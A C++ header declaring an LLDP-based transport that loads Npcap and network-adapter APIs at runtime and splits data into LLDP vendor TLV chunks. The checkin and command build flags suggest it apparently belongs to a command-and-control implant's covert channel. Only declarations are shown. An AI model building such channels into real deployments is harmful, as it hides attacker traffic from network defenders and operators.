#ifndef STARBURST_TRANSPORT_LLDP_H
#define STARBURST_TRANSPORT_LLDP_H

#include <common.h>

#define LLDP_ETH_P_LLDP          0x88CC
#define LLDP_TLV_END             0
#define LLDP_TLV_CHASSIS_ID      1
#define LLDP_TLV_PORT_ID         2
#define LLDP_TLV_TTL             3
#define LLDP_TLV_ORG_SPEC        127

#define LLDP_CHASSIS_MAC         4
#define LLDP_PORT_LOCAL          7

#define LLDP_MAX_CHUNK_DATA      499
#define LLDP_CHUNK_HDR_SIZE      8
#define LLDP_MAX_FRAME           1514
#define LLDP_CONNECT_TIMEOUT_MS  10000
#define LLDP_RECV_POLL_INTERVAL  1
#define MAX_LLDP_PKTS_PER_LOOP   30
#define LLDP_ORG_TLV_OVERHEAD   14   /* hdr(2) + oui(3) + subtype(1) + chunk_hdr(8) */
#define LLDP_MAX_TLVS_PER_FRAME 3

namespace starburst {

    using namespace stardust;

    /* ---------------------------------------------------------------
     *  Npcap (wpcap.dll) function pointer typedefs
     * --------------------------------------------------------------- */

    struct lldp_pcap_addr {
        lldp_pcap_addr* next;
        void* addr;
        void* netmask;
        void* broadaddr;
        void* dstaddr;
    };

    struct lldp_pcap_if {
        lldp_pcap_if* next;
        char* name;
        char* description;
        lldp_pcap_addr* addresses;
        uint32_t flags;
    };

    struct lldp_pcap_pkthdr {
        long tv_sec;
        long tv_usec;
        uint32_t caplen;
        uint32_t len;
    };

    typedef void*  lldp_pcap_t;

    typedef int    (__cdecl *lldp_fn_pcap_findalldevs)( lldp_pcap_if**, char* );
    typedef void   (__cdecl *lldp_fn_pcap_freealldevs)( lldp_pcap_if* );
    typedef lldp_pcap_t (__cdecl *lldp_fn_pcap_open_live)( const char*, int, int, int, char* );
    typedef int    (__cdecl *lldp_fn_pcap_sendpacket)( lldp_pcap_t, const uint8_t*, int );
    typedef int    (__cdecl *lldp_fn_pcap_next_ex)( lldp_pcap_t, lldp_pcap_pkthdr**, const uint8_t** );
    typedef void   (__cdecl *lldp_fn_pcap_close)( lldp_pcap_t );
    typedef int    (__cdecl *lldp_fn_pcap_setnonblock)( lldp_pcap_t, int, char* );
    typedef int    (__cdecl *lldp_fn_pcap_datalink)( lldp_pcap_t );

    struct LldpNpcapApis {
        lldp_fn_pcap_findalldevs  pFindAllDevs;
        lldp_fn_pcap_freealldevs  pFreeAllDevs;
        lldp_fn_pcap_open_live    pOpenLive;
        lldp_fn_pcap_sendpacket   pSendPacket;
        lldp_fn_pcap_next_ex      pNextEx;
        lldp_fn_pcap_close        pClose;
        lldp_fn_pcap_setnonblock  pSetNonblock;
        lldp_fn_pcap_datalink     pDatalink;
    };

    /* ---------------------------------------------------------------
     *  GetAdaptersInfo struct mirrors (same layout as checkin.cc)
     * --------------------------------------------------------------- */

    struct LldpIpAddrString {
        LldpIpAddrString* Next;
        char              IpAddress[16];
        char              IpMask[16];
        DWORD             Context;
    };

    struct LldpAdapterInfo {
        LldpAdapterInfo*  Next;
        DWORD             ComboIndex;
        char              AdapterName[260];
        char              Description[132];
        UINT              AddressLength;
        BYTE              Address[8];
        DWORD             Index;
        UINT              Type;
        UINT              DhcpEnabled;
        LldpIpAddrString* CurrentIpAddress;
        LldpIpAddrString  IpAddressList;
        LldpIpAddrString  GatewayList;
        LldpIpAddrString  DhcpServer;
        BOOL              HaveWins;
        LldpIpAddrString  PrimaryWinsServer;
        LldpIpAddrString  SecondaryWinsServer;
        time_t            LeaseObtained;
        time_t            LeaseExpires;
    };

    typedef DWORD (WINAPI *lldp_fn_GetAdaptersInfo)( LldpAdapterInfo*, PULONG );

    /* ---------------------------------------------------------------
     *  LLDP link state
     * --------------------------------------------------------------- */

    struct LldpLinkState {
        LldpNpcapApis npcap;
        HMODULE       h_wpcap;
        HMODULE       h_iphlpapi;
        uint8_t       src_mac[6];
        uint8_t       oui[3];
        uint8_t       subtype;
        lldp_pcap_t   pcap_handle;
        bool          initialized;
    };

    /* ---------------------------------------------------------------
     *  Function declarations
     * --------------------------------------------------------------- */

    auto declfn lldp_resolve_npcap(
        _Inout_ instance&       inst,
        _Out_   LldpLinkState*  state
    ) -> bool;

    auto declfn lldp_open_adapter(
        _Inout_ instance&       inst,
        _Inout_ LldpLinkState*  state,
        _In_    const char*     iface_name
    ) -> bool;

#if defined( INCLUDE_CMD_LLDP_CONNECT ) || defined( INCLUDE_CMD_LLDP_DISCONNECT ) || defined( LLDP_TRANSPORT )
    auto declfn lldp_poll_links(
        _Inout_ instance& inst
    ) -> void;

    auto declfn lldp_link_send_msg(
        _Inout_ instance&            inst,
        _In_    instance::LldpLink*  link,
        _In_    uint8_t*             data,
        _In_    uint32_t             len
    ) -> bool;
#endif

#if defined( LLDP_TRANSPORT )
    auto declfn lldp_init( instance& inst ) -> bool;
    auto declfn lldp_send( instance& inst, uint8_t* data, uint32_t len,
                           uint8_t** response, uint32_t* resp_len ) -> bool;
    auto declfn lldp_destroy( instance& inst ) -> void;
#endif

}

#endif
